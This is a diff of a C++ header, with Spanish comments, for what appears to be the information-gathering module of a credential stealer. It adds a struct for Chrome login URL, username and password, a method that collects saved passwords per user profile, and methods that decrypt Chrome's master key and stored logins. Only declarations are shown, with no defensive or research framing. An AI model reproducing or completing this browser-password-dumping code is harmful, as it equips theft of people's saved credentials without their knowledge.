@@ -16,6 +16,13 @@ struct Chrome_History {
 	std::string strDate;
 };
 
+struct Chrome_Login_Data {
+	std::string strUrl;
+	std::string strAction;
+	std::string strUser;
+	std::string strPassword;
+};
+
 struct Chrome_Profile {
 	std::string strPath;
 	std::string strName;
@@ -30,14 +37,13 @@ class mod_Info {
 		//Probar para mostrar toda la info
 		void test_Data();
 
-		void test_SQL();
-
-		void test_SimplePassDump(const std::string& strUserPath);
 	private:
 		std::vector<Chrome_Profile> m_ChromeProfiles();
+		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
+
 		std::vector<std::string> m_Usuarios();
 
-		std::string m_Decrypt(const std::string& strPass);
+		std::string m_DecryptMasterKey(const std::string& strPass);
 		std::string m_DecryptLogin(const std::string& strPass);
 
 		std::vector<unsigned char> vcChromeKey;
